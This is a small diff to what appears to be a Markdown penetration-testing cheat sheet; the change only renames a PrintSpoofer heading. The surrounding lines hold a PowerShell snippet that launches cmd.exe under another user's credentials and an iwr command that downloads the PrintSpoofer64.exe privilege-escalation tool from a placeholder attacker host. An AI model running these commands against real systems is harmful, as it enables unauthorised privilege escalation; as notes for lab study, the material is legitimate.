@@ -1905,7 +1905,7 @@ $credential = New-Object System.Management.Automation.PSCredential("domain\ashok
 # Use Start-Process to run a command with the specified credentials
 Start-Process "cmd.exe" -Credential $credential
 ```
-#### PrintSpoofer SeImpersonatePrivilege
+#### PrintSpoofer
 - In PrintSpoofer powershell
 ```powershell
 iwr -uri http://IP:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
